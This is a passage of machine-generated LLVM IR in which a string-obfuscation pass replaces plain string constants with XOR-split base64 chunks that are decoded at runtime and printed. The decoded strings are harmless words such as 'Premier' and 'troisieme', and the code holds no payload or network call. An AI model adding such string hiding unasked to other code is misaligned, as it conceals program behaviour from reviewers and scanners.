  %cast2= getelementptr [9 x i8], [9 x i8]* %spi28, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast2)
  br label %next2
BB_4:
;-------------------------------
; Replace: %cast4= getelementptr [10 x i8], [10 x i8]* @.str3, i64 0, i64 0
  %cipher.ptr.29 = alloca [17 x i8]
;-------------------------------
; Replace: store [17 x i8] c"\64\48\4a\76\61\58\4e\70\5a\57\31\6c\41\41\3d\3d\00", [17 x i8]* %cipher.ptr.29
  %sp66 = alloca [17 x i8]

  
  %sp0.66 = bitcast [17 x i8]* %sp66 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\64", [1 x i8]* %sp0.66
  %sp0.181 = alloca [1 x i8]
  store [1 x i8] c"\0A", [1 x i8]* %sp0.181
  %sp0.1.181 = bitcast [1 x i8]* %sp0.181 to i8*
  %i0.181 = load i8, i8* %sp0.1.181

  %sp1.181 = alloca [1 x i8]
  store [1 x i8] c"\6e", [1 x i8]* %sp1.181
  %sp1.1.181 = bitcast [1 x i8]* %sp1.181 to i8*
  %i1.181 = load i8, i8* %sp1.1.181

  %xp181 = xor i8 %i0.181, %i1.181

  %fi.181 = alloca i8
  store i8 %xp181, i8* %fi.181

  %final.ptr.181 = bitcast i8* %fi.181 to [1 x i8]*
  %spi181 = load [1 x i8], [1 x i8]* %final.ptr.181
  store [1 x i8] %spi181, [1 x i8]* %sp0.66
;-------------------------------
  %next0.66 = getelementptr [17 x i8], [17 x i8]* %sp66, i32 0, i32 1
  
  %sp1.66 = bitcast i8* %next0.66 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\48\4a", [2 x i8]* %sp1.66
  %sp0.182 = alloca [2 x i8]
  store [2 x i8] c"\24\0C", [2 x i8]* %sp0.182
  %sp0.1.182 = bitcast [2 x i8]* %sp0.182 to i16*
  %i0.182 = load i16, i16* %sp0.1.182

  %sp1.182 = alloca [2 x i8]
  store [2 x i8] c"\6c\46", [2 x i8]* %sp1.182
  %sp1.1.182 = bitcast [2 x i8]* %sp1.182 to i16*
  %i1.182 = load i16, i16* %sp1.1.182

  %xp182 = xor i16 %i0.182, %i1.182

  %fi.182 = alloca i16
  store i16 %xp182, i16* %fi.182

  %final.ptr.182 = bitcast i16* %fi.182 to [2 x i8]*
  %spi182 = load [2 x i8], [2 x i8]* %final.ptr.182
  store [2 x i8] %spi182, [2 x i8]* %sp1.66
;-------------------------------
  %next1.66 = getelementptr [17 x i8], [17 x i8]* %sp66, i32 0, i32 3
  
  %sp2.66 = bitcast i8* %next1.66 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\76\61", [2 x i8]* %sp2.66
  %sp0.183 = alloca [2 x i8]
  store [2 x i8] c"\00\30", [2 x i8]* %sp0.183
  %sp0.1.183 = bitcast [2 x i8]* %sp0.183 to i16*
  %i0.183 = load i16, i16* %sp0.1.183

  %sp1.183 = alloca [2 x i8]
  store [2 x i8] c"\76\51", [2 x i8]* %sp1.183
  %sp1.1.183 = bitcast [2 x i8]* %sp1.183 to i16*
  %i1.183 = load i16, i16* %sp1.1.183

  %xp183 = xor i16 %i0.183, %i1.183

  %fi.183 = alloca i16
  store i16 %xp183, i16* %fi.183

  %final.ptr.183 = bitcast i16* %fi.183 to [2 x i8]*
  %spi183 = load [2 x i8], [2 x i8]* %final.ptr.183
  store [2 x i8] %spi183, [2 x i8]* %sp2.66
;-------------------------------
  %next2.66 = getelementptr [17 x i8], [17 x i8]* %sp66, i32 0, i32 5
  
  %sp3.66 = bitcast i8* %next2.66 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\58\4e", [2 x i8]* %sp3.66
  %sp0.184 = alloca [2 x i8]
  store [2 x i8] c"\13\0D", [2 x i8]* %sp0.184
  %sp0.1.184 = bitcast [2 x i8]* %sp0.184 to i16*
  %i0.184 = load i16, i16* %sp0.1.184

  %sp1.184 = alloca [2 x i8]
  store [2 x i8] c"\4b\43", [2 x i8]* %sp1.184
  %sp1.1.184 = bitcast [2 x i8]* %sp1.184 to i16*
  %i1.184 = load i16, i16* %sp1.1.184

  %xp184 = xor i16 %i0.184, %i1.184

  %fi.184 = alloca i16
  store i16 %xp184, i16* %fi.184

  %final.ptr.184 = bitcast i16* %fi.184 to [2 x i8]*
  %spi184 = load [2 x i8], [2 x i8]* %final.ptr.184
  store [2 x i8] %spi184, [2 x i8]* %sp3.66
;-------------------------------
  %next3.66 = getelementptr [17 x i8], [17 x i8]* %sp66, i32 0, i32 7
  
  %sp4.66 = bitcast i8* %next3.66 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\70\5a", [2 x i8]* %sp4.66
  %sp0.185 = alloca [2 x i8]
  store [2 x i8] c"\07\6E", [2 x i8]* %sp0.185
  %sp0.1.185 = bitcast [2 x i8]* %sp0.185 to i16*
  %i0.185 = load i16, i16* %sp0.1.185

  %sp1.185 = alloca [2 x i8]
  store [2 x i8] c"\77\34", [2 x i8]* %sp1.185
  %sp1.1.185 = bitcast [2 x i8]* %sp1.185 to i16*
  %i1.185 = load i16, i16* %sp1.1.185

  %xp185 = xor i16 %i0.185, %i1.185

  %fi.185 = alloca i16
  store i16 %xp185, i16* %fi.185

  %final.ptr.185 = bitcast i16* %fi.185 to [2 x i8]*
  %spi185 = load [2 x i8], [2 x i8]* %final.ptr.185
  store [2 x i8] %spi185, [2 x i8]* %sp4.66
;-------------------------------
  %next4.66 = getelementptr [17 x i8], [17 x i8]* %sp66, i32 0, i32 9
  
  %sp5.66 = bitcast i8* %next4.66 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\57\31", [2 x i8]* %sp5.66
  %sp0.186 = alloca [2 x i8]
  store [2 x i8] c"\1B\55", [2 x i8]* %sp0.186
  %sp0.1.186 = bitcast [2 x i8]* %sp0.186 to i16*
  %i0.186 = load i16, i16* %sp0.1.186

  %sp1.186 = alloca [2 x i8]
  store [2 x i8] c"\4c\64", [2 x i8]* %sp1.186
  %sp1.1.186 = bitcast [2 x i8]* %sp1.186 to i16*
  %i1.186 = load i16, i16* %sp1.1.186

  %xp186 = xor i16 %i0.186, %i1.186

  %fi.186 = alloca i16
  store i16 %xp186, i16* %fi.186

  %final.ptr.186 = bitcast i16* %fi.186 to [2 x i8]*
  %spi186 = load [2 x i8], [2 x i8]* %final.ptr.186
  store [2 x i8] %spi186, [2 x i8]* %sp5.66
;-------------------------------
  %next5.66 = getelementptr [17 x i8], [17 x i8]* %sp66, i32 0, i32 11
  
  %sp6.66 = bitcast i8* %next5.66 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\6c\41", [2 x i8]* %sp6.66
  %sp0.187 = alloca [2 x i8]
  store [2 x i8] c"\0D\31", [2 x i8]* %sp0.187
  %sp0.1.187 = bitcast [2 x i8]* %sp0.187 to i16*
  %i0.187 = load i16, i16* %sp0.1.187

  %sp1.187 = alloca [2 x i8]
  store [2 x i8] c"\61\70", [2 x i8]* %sp1.187
  %sp1.1.187 = bitcast [2 x i8]* %sp1.187 to i16*
  %i1.187 = load i16, i16* %sp1.1.187

  %xp187 = xor i16 %i0.187, %i1.187

  %fi.187 = alloca i16
  store i16 %xp187, i16* %fi.187

  %final.ptr.187 = bitcast i16* %fi.187 to [2 x i8]*
  %spi187 = load [2 x i8], [2 x i8]* %final.ptr.187
  store [2 x i8] %spi187, [2 x i8]* %sp6.66
;-------------------------------
  %next6.66 = getelementptr [17 x i8], [17 x i8]* %sp66, i32 0, i32 13
  
  %sp7.66 = bitcast i8* %next6.66 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\41\3d", [2 x i8]* %sp7.66
  %sp0.188 = alloca [2 x i8]
  store [2 x i8] c"\07\7E", [2 x i8]* %sp0.188
  %sp0.1.188 = bitcast [2 x i8]* %sp0.188 to i16*
  %i0.188 = load i16, i16* %sp0.1.188

  %sp1.188 = alloca [2 x i8]
  store [2 x i8] c"\46\43", [2 x i8]* %sp1.188
  %sp1.1.188 = bitcast [2 x i8]* %sp1.188 to i16*
  %i1.188 = load i16, i16* %sp1.1.188

  %xp188 = xor i16 %i0.188, %i1.188

  %fi.188 = alloca i16
  store i16 %xp188, i16* %fi.188

  %final.ptr.188 = bitcast i16* %fi.188 to [2 x i8]*
  %spi188 = load [2 x i8], [2 x i8]* %final.ptr.188
  store [2 x i8] %spi188, [2 x i8]* %sp7.66
;-------------------------------
  %next7.66 = getelementptr [17 x i8], [17 x i8]* %sp66, i32 0, i32 15
  
  %sp8.66 = bitcast i8* %next7.66 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\3d\00", [2 x i8]* %sp8.66
  %sp0.189 = alloca [2 x i8]
  store [2 x i8] c"\51\46", [2 x i8]* %sp0.189
  %sp0.1.189 = bitcast [2 x i8]* %sp0.189 to i16*
  %i0.189 = load i16, i16* %sp0.1.189

  %sp1.189 = alloca [2 x i8]
  store [2 x i8] c"\6c\46", [2 x i8]* %sp1.189
  %sp1.1.189 = bitcast [2 x i8]* %sp1.189 to i16*
  %i1.189 = load i16, i16* %sp1.1.189

  %xp189 = xor i16 %i0.189, %i1.189

  %fi.189 = alloca i16
  store i16 %xp189, i16* %fi.189

  %final.ptr.189 = bitcast i16* %fi.189 to [2 x i8]*
  %spi189 = load [2 x i8], [2 x i8]* %final.ptr.189
  store [2 x i8] %spi189, [2 x i8]* %sp8.66
;-------------------------------

  %spi66 = load [17 x i8], [17 x i8]* %sp66
  store [17 x i8] %spi66, [17 x i8]* %cipher.ptr.29
;-------------------------------
  %cipher.29 = getelementptr inbounds [17 x i8], [17 x i8]* %cipher.ptr.29, i32 0, i32 0
  %plain.ptr.29 = tail call i8* @base64_decode(i8* %cipher.29)
  %spi29 = bitcast i8* %plain.ptr.29 to [10 x i8]*
  %cast4= getelementptr [10 x i8], [10 x i8]* %spi29, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast4)
  br label %next4
BB_6:
;-------------------------------
; Replace: %cast6= getelementptr [11 x i8], [11 x i8]* @.str5, i64 0, i64 0
  %cipher.ptr.30 = alloca [17 x i8]
;-------------------------------
; Replace: store [17 x i8] c"\62\32\74\70\62\32\70\32\61\53\78\6c\63\67\41\3d\00", [17 x i8]* %cipher.ptr.30
  %sp67 = alloca [17 x i8]

  
  %sp0.67 = bitcast [17 x i8]* %sp67 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\62", [1 x i8]* %sp0.67
  %sp0.190 = alloca [1 x i8]
  store [1 x i8] c"\12", [1 x i8]* %sp0.190
  %sp0.1.190 = bitcast [1 x i8]* %sp0.190 to i8*
  %i0.190 = load i8, i8* %sp0.1.190

  %sp1.190 = alloca [1 x i8]
  store [1 x i8] c"\70", [1 x i8]* %sp1.190
  %sp1.1.190 = bitcast [1 x i8]* %sp1.190 to i8*
  %i1.190 = load i8, i8* %sp1.1.190

  %xp190 = xor i8 %i0.190, %i1.190

  %fi.190 = alloca i8
  store i8 %xp190, i8* %fi.190

  %final.ptr.190 = bitcast i8* %fi.190 to [1 x i8]*
  %spi190 = load [1 x i8], [1 x i8]* %final.ptr.190
  store [1 x i8] %spi190, [1 x i8]* %sp0.67
;-------------------------------
  %next0.67 = getelementptr [17 x i8], [17 x i8]* %sp67, i32 0, i32 1
  
  %sp1.67 = bitcast i8* %next0.67 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\32\74", [2 x i8]* %sp1.67
  %sp0.191 = alloca [2 x i8]
  store [2 x i8] c"\6B\1C", [2 x i8]* %sp0.191
  %sp0.1.191 = bitcast [2 x i8]* %sp0.191 to i16*
  %i0.191 = load i16, i16* %sp0.1.191

  %sp1.191 = alloca [2 x i8]
  store [2 x i8] c"\59\68", [2 x i8]* %sp1.191
  %sp1.1.191 = bitcast [2 x i8]* %sp1.191 to i16*
  %i1.191 = load i16, i16* %sp1.1.191

  %xp191 = xor i16 %i0.191, %i1.191

  %fi.191 = alloca i16
  store i16 %xp191, i16* %fi.191

  %final.ptr.191 = bitcast i16* %fi.191 to [2 x i8]*
  %spi191 = load [2 x i8], [2 x i8]* %final.ptr.191
  store [2 x i8] %spi191, [2 x i8]* %sp1.67
;-------------------------------
  %next1.67 = getelementptr [17 x i8], [17 x i8]* %sp67, i32 0, i32 3
  
  %sp2.67 = bitcast i8* %next1.67 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\70\62", [2 x i8]* %sp2.67
  %sp0.192 = alloca [2 x i8]
  store [2 x i8] c"\38\0A", [2 x i8]* %sp0.192
  %sp0.1.192 = bitcast [2 x i8]* %sp0.192 to i16*
  %i0.192 = load i16, i16* %sp0.1.192

  %sp1.192 = alloca [2 x i8]
  store [2 x i8] c"\48\68", [2 x i8]* %sp1.192
  %sp1.1.192 = bitcast [2 x i8]* %sp1.192 to i16*
  %i1.192 = load i16, i16* %sp1.1.192

  %xp192 = xor i16 %i0.192, %i1.192

  %fi.192 = alloca i16
  store i16 %xp192, i16* %fi.192

  %final.ptr.192 = bitcast i16* %fi.192 to [2 x i8]*
  %spi192 = load [2 x i8], [2 x i8]* %final.ptr.192
  store [2 x i8] %spi192, [2 x i8]* %sp2.67
;-------------------------------
  %next2.67 = getelementptr [17 x i8], [17 x i8]* %sp67, i32 0, i32 5
  
  %sp3.67 = bitcast i8* %next2.67 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\32\70", [2 x i8]* %sp3.67
  %sp0.193 = alloca [2 x i8]
  store [2 x i8] c"\65\02", [2 x i8]* %sp0.193
  %sp0.1.193 = bitcast [2 x i8]* %sp0.193 to i16*
  %i0.193 = load i16, i16* %sp0.1.193

  %sp1.193 = alloca [2 x i8]
  store [2 x i8] c"\57\72", [2 x i8]* %sp1.193
  %sp1.1.193 = bitcast [2 x i8]* %sp1.193 to i16*
  %i1.193 = load i16, i16* %sp1.1.193

  %xp193 = xor i16 %i0.193, %i1.193

  %fi.193 = alloca i16
  store i16 %xp193, i16* %fi.193

  %final.ptr.193 = bitcast i16* %fi.193 to [2 x i8]*
  %spi193 = load [2 x i8], [2 x i8]* %final.ptr.193
  store [2 x i8] %spi193, [2 x i8]* %sp3.67
;-------------------------------
  %next3.67 = getelementptr [17 x i8], [17 x i8]* %sp67, i32 0, i32 7
  
  %sp4.67 = bitcast i8* %next3.67 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\32\61", [2 x i8]* %sp4.67
  %sp0.194 = alloca [2 x i8]
  store [2 x i8] c"\0B\2C", [2 x i8]* %sp0.194
  %sp0.1.194 = bitcast [2 x i8]* %sp0.194 to i16*
  %i0.194 = load i16, i16* %sp0.1.194

  %sp1.194 = alloca [2 x i8]
  store [2 x i8] c"\39\4d", [2 x i8]* %sp1.194
  %sp1.1.194 = bitcast [2 x i8]* %sp1.194 to i16*
  %i1.194 = load i16, i16* %sp1.1.194

  %xp194 = xor i16 %i0.194, %i1.194

  %fi.194 = alloca i16
  store i16 %xp194, i16* %fi.194

  %final.ptr.194 = bitcast i16* %fi.194 to [2 x i8]*
  %spi194 = load [2 x i8], [2 x i8]* %final.ptr.194
  store [2 x i8] %spi194, [2 x i8]* %sp4.67
;-------------------------------
  %next4.67 = getelementptr [17 x i8], [17 x i8]* %sp67, i32 0, i32 9
  
  %sp5.67 = bitcast i8* %next4.67 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\53\78", [2 x i8]* %sp5.67
  %sp0.195 = alloca [2 x i8]
  store [2 x i8] c"\39\1A", [2 x i8]* %sp0.195
  %sp0.1.195 = bitcast [2 x i8]* %sp0.195 to i16*
  %i0.195 = load i16, i16* %sp0.1.195

  %sp1.195 = alloca [2 x i8]
  store [2 x i8] c"\6a\62", [2 x i8]* %sp1.195
  %sp1.1.195 = bitcast [2 x i8]* %sp1.195 to i16*
  %i1.195 = load i16, i16* %sp1.1.195

  %xp195 = xor i16 %i0.195, %i1.195

  %fi.195 = alloca i16
  store i16 %xp195, i16* %fi.195

  %final.ptr.195 = bitcast i16* %fi.195 to [2 x i8]*
  %spi195 = load [2 x i8], [2 x i8]* %final.ptr.195
  store [2 x i8] %spi195, [2 x i8]* %sp5.67
;-------------------------------
  %next5.67 = getelementptr [17 x i8], [17 x i8]* %sp67, i32 0, i32 11
  
  %sp6.67 = bitcast i8* %next5.67 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\6c\63", [2 x i8]* %sp6.67
  %sp0.196 = alloca [2 x i8]
  store [2 x i8] c"\3B\5A", [2 x i8]* %sp0.196
  %sp0.1.196 = bitcast [2 x i8]* %sp0.196 to i16*
  %i0.196 = load i16, i16* %sp0.1.196

  %sp1.196 = alloca [2 x i8]
  store [2 x i8] c"\57\39", [2 x i8]* %sp1.196
  %sp1.1.196 = bitcast [2 x i8]* %sp1.196 to i16*
  %i1.196 = load i16, i16* %sp1.1.196

  %xp196 = xor i16 %i0.196, %i1.196

  %fi.196 = alloca i16
  store i16 %xp196, i16* %fi.196

  %final.ptr.196 = bitcast i16* %fi.196 to [2 x i8]*
  %spi196 = load [2 x i8], [2 x i8]* %final.ptr.196
  store [2 x i8] %spi196, [2 x i8]* %sp6.67
;-------------------------------
  %next6.67 = getelementptr [17 x i8], [17 x i8]* %sp67, i32 0, i32 13
  
  %sp7.67 = bitcast i8* %next6.67 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\67\41", [2 x i8]* %sp7.67
  %sp0.197 = alloca [2 x i8]
  store [2 x i8] c"\0B\23", [2 x i8]* %sp0.197
  %sp0.1.197 = bitcast [2 x i8]* %sp0.197 to i16*
  %i0.197 = load i16, i16* %sp0.1.197

  %sp1.197 = alloca [2 x i8]
  store [2 x i8] c"\6c\62", [2 x i8]* %sp1.197
  %sp1.1.197 = bitcast [2 x i8]* %sp1.197 to i16*
  %i1.197 = load i16, i16* %sp1.1.197

  %xp197 = xor i16 %i0.197, %i1.197

  %fi.197 = alloca i16
  store i16 %xp197, i16* %fi.197

  %final.ptr.197 = bitcast i16* %fi.197 to [2 x i8]*
  %spi197 = load [2 x i8], [2 x i8]* %final.ptr.197
  store [2 x i8] %spi197, [2 x i8]* %sp7.67
;-------------------------------
  %next7.67 = getelementptr [17 x i8], [17 x i8]* %sp67, i32 0, i32 15
  
  %sp8.67 = bitcast i8* %next7.67 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\3d\00", [2 x i8]* %sp8.67
  %sp0.198 = alloca [2 x i8]
  store [2 x i8] c"\64\74", [2 x i8]* %sp0.198
  %sp0.1.198 = bitcast [2 x i8]* %sp0.198 to i16*
  %i0.198 = load i16, i16* %sp0.1.198

  %sp1.198 = alloca [2 x i8]
  store [2 x i8] c"\59\74", [2 x i8]* %sp1.198
  %sp1.1.198 = bitcast [2 x i8]* %sp1.198 to i16*
  %i1.198 = load i16, i16* %sp1.1.198

  %xp198 = xor i16 %i0.198, %i1.198

  %fi.198 = alloca i16
  store i16 %xp198, i16* %fi.198

  %final.ptr.198 = bitcast i16* %fi.198 to [2 x i8]*
  %spi198 = load [2 x i8], [2 x i8]* %final.ptr.198
  store [2 x i8] %spi198, [2 x i8]* %sp8.67
;-------------------------------

  %spi67 = load [17 x i8], [17 x i8]* %sp67
  store [17 x i8] %spi67, [17 x i8]* %cipher.ptr.30
;-------------------------------
  %cipher.30 = getelementptr inbounds [17 x i8], [17 x i8]* %cipher.ptr.30, i32 0, i32 0
  %plain.ptr.30 = tail call i8* @base64_decode(i8* %cipher.30)
  %spi30 = bitcast i8* %plain.ptr.30 to [11 x i8]*
  %cast6= getelementptr [11 x i8], [11 x i8]* %spi30, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast6)
  br label %next6
BB_8:
;-------------------------------
; Replace: %cast8= getelementptr [8 x i8], [8 x i8]* @.str7, i64 0, i64 0
  %cipher.ptr.31 = alloca [13 x i8]
;-------------------------------
; Replace: store [13 x i8] c"\55\48\4a\6c\62\57\6c\6c\63\67\41\3d\00", [13 x i8]* %cipher.ptr.31
  %sp68 = alloca [13 x i8]

  
  %sp0.68 = bitcast [13 x i8]* %sp68 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\55", [1 x i8]* %sp0.68
  %sp0.199 = alloca [1 x i8]
  store [1 x i8] c"\60", [1 x i8]* %sp0.199
  %sp0.1.199 = bitcast [1 x i8]* %sp0.199 to i8*
  %i0.199 = load i8, i8* %sp0.1.199

  %sp1.199 = alloca [1 x i8]
  store [1 x i8] c"\35", [1 x i8]* %sp1.199
  %sp1.1.199 = bitcast [1 x i8]* %sp1.199 to i8*
  %i1.199 = load i8, i8* %sp1.1.199

  %xp199 = xor i8 %i0.199, %i1.199

  %fi.199 = alloca i8
  store i8 %xp199, i8* %fi.199

  %final.ptr.199 = bitcast i8* %fi.199 to [1 x i8]*
  %spi199 = load [1 x i8], [1 x i8]* %final.ptr.199
  store [1 x i8] %spi199, [1 x i8]* %sp0.68
;-------------------------------
  %next0.68 = getelementptr [13 x i8], [13 x i8]* %sp68, i32 0, i32 1
  
  %sp1.68 = bitcast i8* %next0.68 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\48", [1 x i8]* %sp1.68
  %sp0.200 = alloca [1 x i8]
  store [1 x i8] c"\0A", [1 x i8]* %sp0.200
  %sp0.1.200 = bitcast [1 x i8]* %sp0.200 to i8*
  %i0.200 = load i8, i8* %sp0.1.200

  %sp1.200 = alloca [1 x i8]
  store [1 x i8] c"\42", [1 x i8]* %sp1.200
  %sp1.1.200 = bitcast [1 x i8]* %sp1.200 to i8*
  %i1.200 = load i8, i8* %sp1.1.200

  %xp200 = xor i8 %i0.200, %i1.200

  %fi.200 = alloca i8
  store i8 %xp200, i8* %fi.200

  %final.ptr.200 = bitcast i8* %fi.200 to [1 x i8]*
  %spi200 = load [1 x i8], [1 x i8]* %final.ptr.200
  store [1 x i8] %spi200, [1 x i8]* %sp1.68
;-------------------------------
  %next1.68 = getelementptr [13 x i8], [13 x i8]* %sp68, i32 0, i32 2
  
  %sp2.68 = bitcast i8* %next1.68 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\4a\6c", [2 x i8]* %sp2.68
  %sp0.201 = alloca [2 x i8]
  store [2 x i8] c"\39\0A", [2 x i8]* %sp0.201
  %sp0.1.201 = bitcast [2 x i8]* %sp0.201 to i16*
  %i0.201 = load i16, i16* %sp0.1.201

  %sp1.201 = alloca [2 x i8]
  store [2 x i8] c"\73\66", [2 x i8]* %sp1.201
  %sp1.1.201 = bitcast [2 x i8]* %sp1.201 to i16*
  %i1.201 = load i16, i16* %sp1.1.201

  %xp201 = xor i16 %i0.201, %i1.201

  %fi.201 = alloca i16
  store i16 %xp201, i16* %fi.201

  %final.ptr.201 = bitcast i16* %fi.201 to [2 x i8]*
  %spi201 = load [2 x i8], [2 x i8]* %final.ptr.201
  store [2 x i8] %spi201, [2 x i8]* %sp2.68
;-------------------------------
  %next2.68 = getelementptr [13 x i8], [13 x i8]* %sp68, i32 0, i32 4
  
  %sp3.68 = bitcast i8* %next2.68 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\62", [1 x i8]* %sp3.68
  %sp0.202 = alloca [1 x i8]
  store [1 x i8] c"\14", [1 x i8]* %sp0.202
  %sp0.1.202 = bitcast [1 x i8]* %sp0.202 to i8*
  %i0.202 = load i8, i8* %sp0.1.202

  %sp1.202 = alloca [1 x i8]
  store [1 x i8] c"\76", [1 x i8]* %sp1.202
  %sp1.1.202 = bitcast [1 x i8]* %sp1.202 to i8*
  %i1.202 = load i8, i8* %sp1.1.202

  %xp202 = xor i8 %i0.202, %i1.202

  %fi.202 = alloca i8
  store i8 %xp202, i8* %fi.202

  %final.ptr.202 = bitcast i8* %fi.202 to [1 x i8]*
  %spi202 = load [1 x i8], [1 x i8]* %final.ptr.202
  store [1 x i8] %spi202, [1 x i8]* %sp3.68
;-------------------------------
  %next3.68 = getelementptr [13 x i8], [13 x i8]* %sp68, i32 0, i32 5
  
  %sp4.68 = bitcast i8* %next3.68 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\57\6c", [2 x i8]* %sp4.68
  %sp0.203 = alloca [2 x i8]
  store [2 x i8] c"\62\3D", [2 x i8]* %sp0.203
  %sp0.1.203 = bitcast [2 x i8]* %sp0.203 to i16*
  %i0.203 = load i16, i16* %sp0.1.203

  %sp1.203 = alloca [2 x i8]
  store [2 x i8] c"\35\51", [2 x i8]* %sp1.203
  %sp1.1.203 = bitcast [2 x i8]* %sp1.203 to i16*
  %i1.203 = load i16, i16* %sp1.1.203

  %xp203 = xor i16 %i0.203, %i1.203

  %fi.203 = alloca i16
  store i16 %xp203, i16* %fi.203

  %final.ptr.203 = bitcast i16* %fi.203 to [2 x i8]*
  %spi203 = load [2 x i8], [2 x i8]* %final.ptr.203
  store [2 x i8] %spi203, [2 x i8]* %sp4.68
;-------------------------------
  %next4.68 = getelementptr [13 x i8], [13 x i8]* %sp68, i32 0, i32 7
  
  %sp5.68 = bitcast i8* %next4.68 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\6c", [1 x i8]* %sp5.68
  %sp0.204 = alloca [1 x i8]
  store [1 x i8] c"\59", [1 x i8]* %sp0.204
  %sp0.1.204 = bitcast [1 x i8]* %sp0.204 to i8*
  %i0.204 = load i8, i8* %sp0.1.204

  %sp1.204 = alloca [1 x i8]
  store [1 x i8] c"\35", [1 x i8]* %sp1.204
  %sp1.1.204 = bitcast [1 x i8]* %sp1.204 to i8*
  %i1.204 = load i8, i8* %sp1.1.204

  %xp204 = xor i8 %i0.204, %i1.204

  %fi.204 = alloca i8
  store i8 %xp204, i8* %fi.204

  %final.ptr.204 = bitcast i8* %fi.204 to [1 x i8]*
  %spi204 = load [1 x i8], [1 x i8]* %final.ptr.204
  store [1 x i8] %spi204, [1 x i8]* %sp5.68
;-------------------------------
  %next5.68 = getelementptr [13 x i8], [13 x i8]* %sp68, i32 0, i32 8
  
  %sp6.68 = bitcast i8* %next5.68 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\63\67", [2 x i8]* %sp6.68
  %sp0.205 = alloca [2 x i8]
  store [2 x i8] c"\04\0E", [2 x i8]* %sp0.205
  %sp0.1.205 = bitcast [2 x i8]* %sp0.205 to i16*
  %i0.205 = load i16, i16* %sp0.1.205

  %sp1.205 = alloca [2 x i8]
  store [2 x i8] c"\67\69", [2 x i8]* %sp1.205
  %sp1.1.205 = bitcast [2 x i8]* %sp1.205 to i16*
  %i1.205 = load i16, i16* %sp1.1.205

  %xp205 = xor i16 %i0.205, %i1.205

  %fi.205 = alloca i16
  store i16 %xp205, i16* %fi.205

  %final.ptr.205 = bitcast i16* %fi.205 to [2 x i8]*
  %spi205 = load [2 x i8], [2 x i8]* %final.ptr.205
  store [2 x i8] %spi205, [2 x i8]* %sp6.68
;-------------------------------
  %next6.68 = getelementptr [13 x i8], [13 x i8]* %sp68, i32 0, i32 10
  
  %sp7.68 = bitcast i8* %next6.68 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\41", [1 x i8]* %sp7.68
  %sp0.206 = alloca [1 x i8]
  store [1 x i8] c"\32", [1 x i8]* %sp0.206
  %sp0.1.206 = bitcast [1 x i8]* %sp0.206 to i8*
  %i0.206 = load i8, i8* %sp0.1.206

  %sp1.206 = alloca [1 x i8]
  store [1 x i8] c"\73", [1 x i8]* %sp1.206
  %sp1.1.206 = bitcast [1 x i8]* %sp1.206 to i8*
  %i1.206 = load i8, i8* %sp1.1.206

  %xp206 = xor i8 %i0.206, %i1.206

  %fi.206 = alloca i8
  store i8 %xp206, i8* %fi.206

  %final.ptr.206 = bitcast i8* %fi.206 to [1 x i8]*
  %spi206 = load [1 x i8], [1 x i8]* %final.ptr.206
  store [1 x i8] %spi206, [1 x i8]* %sp7.68
;-------------------------------
  %next7.68 = getelementptr [13 x i8], [13 x i8]* %sp68, i32 0, i32 11
  
  %sp8.68 = bitcast i8* %next7.68 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\3d\00", [2 x i8]* %sp8.68
  %sp0.207 = alloca [2 x i8]
  store [2 x i8] c"\76\45", [2 x i8]* %sp0.207
  %sp0.1.207 = bitcast [2 x i8]* %sp0.207 to i16*
  %i0.207 = load i16, i16* %sp0.1.207

  %sp1.207 = alloca [2 x i8]
  store [2 x i8] c"\4b\45", [2 x i8]* %sp1.207
  %sp1.1.207 = bitcast [2 x i8]* %sp1.207 to i16*
  %i1.207 = load i16, i16* %sp1.1.207

  %xp207 = xor i16 %i0.207, %i1.207

  %fi.207 = alloca i16
  store i16 %xp207, i16* %fi.207

  %final.ptr.207 = bitcast i16* %fi.207 to [2 x i8]*
  %spi207 = load [2 x i8], [2 x i8]* %final.ptr.207
  store [2 x i8] %spi207, [2 x i8]* %sp8.68
;-------------------------------

  %spi68 = load [13 x i8], [13 x i8]* %sp68
  store [13 x i8] %spi68, [13 x i8]* %cipher.ptr.31
;-------------------------------
  %cipher.31 = getelementptr inbounds [13 x i8], [13 x i8]* %cipher.ptr.31, i32 0, i32 0
  %plain.ptr.31 = tail call i8* @base64_decode(i8* %cipher.31)
  %spi31 = bitcast i8* %plain.ptr.31 to [8 x i8]*
  %cast8= getelementptr [8 x i8], [8 x i8]* %spi31, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast8)
  br label %next8
BB_10:
;-------------------------------
; Replace: %cast10= getelementptr [10 x i8], [10 x i8]* @.str9, i64 0, i64 0
  %cipher.ptr.32 = alloca [17 x i8]
;-------------------------------
; Replace: store [17 x i8] c"\64\48\4a\76\61\58\4e\70\5a\57\31\6c\41\41\3d\3d\00", [17 x i8]* %cipher.ptr.32
  %sp69 = alloca [17 x i8]

  
